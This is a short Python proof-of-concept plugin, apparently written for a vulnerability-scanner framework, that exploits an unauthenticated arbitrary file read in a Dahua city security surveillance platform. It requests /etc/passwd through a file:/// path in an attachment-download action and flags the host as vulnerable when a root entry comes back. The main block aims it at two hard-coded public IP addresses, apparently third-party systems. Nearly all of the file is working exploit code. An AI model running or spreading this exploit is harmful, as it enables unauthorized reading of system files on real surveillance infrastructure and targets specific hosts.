#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
POC Name  :  大华城市安防监控系统平台管理存在任意文件遍历(无需登录) 
Author    :  a
mail      :  a@lcx.cc
refer     ：WooYun-2015-131730

"""
import urlparse
import time

def assign(service, arg):
    if service == 'dahua_dss':
        arr = urlparse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)
def audit(arg):
    p = 'portal/attachment_downloadByUrlAtt.action?filePath=file:///etc/passwd'
    url = arg + p
    code2, head, res, errcode, _ = curl.curl2(url )
    #print res
    if (code2 == 200) and('root:x:0:0:root:/root:/bin/bash' in res) :
        security_hole(url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('dahua_dss', 'http://61.185.80.228/')[1])
    audit(assign('dahua_dss', 'http://113.106.236.12:8000/')[1])